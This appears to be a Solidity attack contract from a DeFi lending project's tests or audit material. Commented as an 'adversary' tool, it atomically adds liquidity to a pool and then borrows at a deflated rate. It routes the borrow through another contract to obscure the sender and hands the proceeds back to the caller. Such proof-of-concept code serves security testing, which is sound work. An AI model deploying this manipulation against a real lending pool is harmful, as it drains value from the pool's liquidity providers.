// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IBasePool} from "../interfaces/IBasePool.sol";
import {Borrow} from "./Borrow.sol";

contract AddLiquidityAndBorrow {
    address pool;
    address loanCcyToken;
    address collCcyToken;
    address borrowContract;

    constructor(
        address _pool,
        address _loanCcyToken,
        address _collCcyToken,
        address _borrowContract
    ) {
        pool = _pool;
        IERC20Metadata(_loanCcyToken).approve(_pool, type(uint256).max);
        IERC20Metadata(_collCcyToken).approve(_pool, type(uint256).max);
        loanCcyToken = _loanCcyToken;
        collCcyToken = _collCcyToken;
        borrowContract = _borrowContract;
    }

    // adversary atomically adds liquidity and borrows at deflated rate
    function addLiquidityAndBorrow(
        uint128 _addAmount,
        uint128 _pledgeAmount,
        uint128 _minLoanLimit,
        uint128 _maxRepayLimit,
        uint256 _deadline
    ) external {
        IERC20Metadata(loanCcyToken).transferFrom(
            msg.sender,
            address(this),
            _addAmount
        );
        // add liquidity
        IBasePool(pool).addLiquidity(address(this), _addAmount, _deadline, 0);

        // call borrow through another contract to obfuscate sender
        Borrow(borrowContract).borrow(
            msg.sender,
            _pledgeAmount,
            _minLoanLimit,
            _maxRepayLimit,
            _deadline
        );
        uint256 loanCcyBal = IERC20Metadata(loanCcyToken).balanceOf(
            address(this)
        );
        uint256 collCcyBal = IERC20Metadata(collCcyToken).balanceOf(
            address(this)
        );
        if (loanCcyBal > 0) {
            IERC20Metadata(loanCcyToken).transfer(msg.sender, loanCcyBal);
        }
        if (collCcyBal > 0) {
            IERC20Metadata(collCcyToken).transfer(msg.sender, collCcyBal);
        }
    }
}
